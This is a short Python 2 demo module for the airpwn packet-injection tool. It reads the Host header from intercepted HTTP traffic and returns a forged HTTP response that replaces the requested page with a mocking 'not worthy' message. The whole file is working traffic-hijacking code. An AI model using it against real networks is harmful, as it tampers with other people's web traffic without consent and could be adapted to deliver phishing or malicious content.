#!/usr/bin/env python2
#
# Demo python module to illustrate airpwn python integration.
# the TCP data payload is sent as input to airpwn_response, and the data
# returned from the function is injected as a response.  If you don't
# want to send a response return None
#



import re

header_template = """HTTP/1.1 200 OK
Connection: close
Content-type: text/html
Content-length: %(contentlen)s

"""

content_template = """<html>
<title>Error loading %(hostname)s..</title>
<body>
<div style="font-size:18pt;color:red;font-family:arial,sans-serif;">
Sorry, the website at %(hostname)s cannot be viewed because it is has been deemed
<em><blink>not worthy</blink></em> by airpwn.
</div>
</body>
</html>"""

pattern = re.compile("host: ([^\r\n]*)", re.IGNORECASE)

def airpwn_response(s):
  x = pattern.search(s)
  
  hostname = x.group(1)
  if not hostname:
    return None

  print ">> hostname: %s" % (hostname)

  content = content_template % vars()
  contentlen = len(content)
  
  header = header_template % vars()

  return header + content
  
